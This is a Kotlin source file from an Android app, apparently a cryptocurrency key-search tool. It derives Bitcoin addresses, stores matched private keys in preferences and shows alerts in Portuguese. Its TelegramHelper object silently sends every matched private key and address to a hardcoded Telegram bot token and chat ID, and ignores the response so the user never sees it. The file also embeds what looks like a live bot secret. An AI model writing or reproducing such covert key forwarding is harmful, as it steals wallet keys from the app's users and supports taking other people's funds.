package com.example.keyspaceexplorer

import android.annotation.SuppressLint
import android.content.SharedPreferences
import android.preference.PreferenceManager
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import okhttp3.Call
import okhttp3.Callback
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import org.bitcoinj.core.Base58
import org.bouncycastle.crypto.digests.RIPEMD160Digest
import java.io.IOException
import java.security.MessageDigest

fun formatMatchMessage(item: PrivateKeyItem): String {
    return buildString {
        appendLine("🔐 Chave Privada:")
        appendLine("   ${item.hex}")
        appendLine()
        appendLine("📬 Endereço(s) que deu match:")
        item.matched?.forEach { address ->
            appendLine(address.fullAddressPretty())
        }
    }.trim()
}

object AlertHelper {
    fun alertMatch(item: PrivateKeyItem) {
        try {
            MainActivity.Instance?.context.let { activity ->
                val message = buildString {
                    appendLine("🔐 Chave Privada:")
                    appendLine("   ${item.hex}")
                    appendLine()
                    appendLine("📬 Endereço(s) que deu match:")
                    item.matched?.forEach { address ->
                        appendLine(address.fullAddressPretty())
                    }
                }

                MainActivity.Instance?.context?.let {
                    AlertDialog.Builder(it)
                        .setTitle("✅ Match encontrado no banco e salvo em meus matches!")
                        .setMessage(message)
                        .setPositiveButton("OK", null)
                        .show()
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}

object TelegramHelper {
    private const val TELEGRAM_URL = "https://api.telegram.org/bot7688830724:AAHnBdSNgwnjNKyq62f_ZjlhQiNFHzm0SIU/sendMessage"
    private const val TELEGRAM_ID = "27196478"

    fun sendAlert(item: PrivateKeyItem) {
        try {
            val body = formatMatchMessage(item)
            val form = FormBody.Builder()
                .add("chat_id", TELEGRAM_ID)
                .add("text", body)
                .build()
            val request = Request.Builder().url(TELEGRAM_URL).post(form).build()
            OkHttpClient().newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {}
                override fun onResponse(call: Call, response: Response) {}
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}

object StorageHelper {
    private val gson = Gson()
    private const val MATCHES_KEY = "matches"

    @SuppressLint("MutatingSharedPrefs", "UseKtx")
    fun saveMatch(item: PrivateKeyItem) {
        try {
            val prefs = PreferenceManager.getDefaultSharedPreferences(MainActivity.Instance.context)
            val current = getMatches(prefs).toMutableList()

            // Evita duplicatas
            if (current.none { it.hex == item.hex }) {
                current.add(item)
                val json = gson.toJson(current)
                prefs.edit().putString(MATCHES_KEY, json).apply()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun getMatches(): List<PrivateKeyItem> {
        val prefs = PreferenceManager.getDefaultSharedPreferences(MainActivity.Instance.context)
        return getMatches(prefs)
    }

    private fun getMatches(prefs: SharedPreferences): List<PrivateKeyItem> {
        return try {
            val json = prefs.getString(MATCHES_KEY, null)
            if (json != null) {
                val type = object : TypeToken<List<PrivateKeyItem>>() {}.type
                gson.fromJson(json, type)
            } else emptyList()
        } catch (e: Exception) {
            e.printStackTrace()
            emptyList()
        }
    }

    fun alreadySaved(item: PrivateKeyItem): Boolean {
        return try {
            val saved = getMatches()
            saved.any { it.hex == item.hex }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }
}

object LogHelper {
    fun logMatch(item: PrivateKeyItem) {
        try {
            val message = formatMatchMessage(item)
            Log.d("MATCH", "\n$message")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}

object ToastHelper {
    fun showToast(item: PrivateKeyItem) {
        try {
            val msg = "Match: ${item.matched?.firstOrNull()?.address ?: "?"}"
            Toast.makeText(MainActivity.Instance.context, msg, Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}

object AddressUtils {

    fun pubKeyToAddress(pubKey: ByteArray): String {
        // 1. SHA-256
        val sha256 = MessageDigest.getInstance("SHA-256").digest(pubKey)

        // 2. RIPEMD-160
        val ripemd160 = RIPEMD160Digest().apply { update(sha256, 0, sha256.size) }
        val hash160 = ByteArray(20)
        ripemd160.doFinal(hash160, 0)

        // 3. Prefix (0x00 para BTC mainnet P2PKH)
        val prefix = byteArrayOf(0x00)

        // 4. Payload
        val payload = prefix + hash160

        // 5. Checksum = SHA256(SHA256(payload)).take(4)
        val checksum = MessageDigest.getInstance("SHA-256").digest(
            MessageDigest.getInstance("SHA-256").digest(payload)
        ).take(4).toByteArray()

        // 6. Base58(Payload + Checksum)
        return Base58.encode(payload + checksum)
    }

    fun normalize(address: String, coin: String): String {
        return when (coin.uppercase()) {
            "ETH" -> address.lowercase().removePrefix("0x")
            "BCH" -> address.removePrefix("bitcoincash:")
            else -> address
        }
    }
}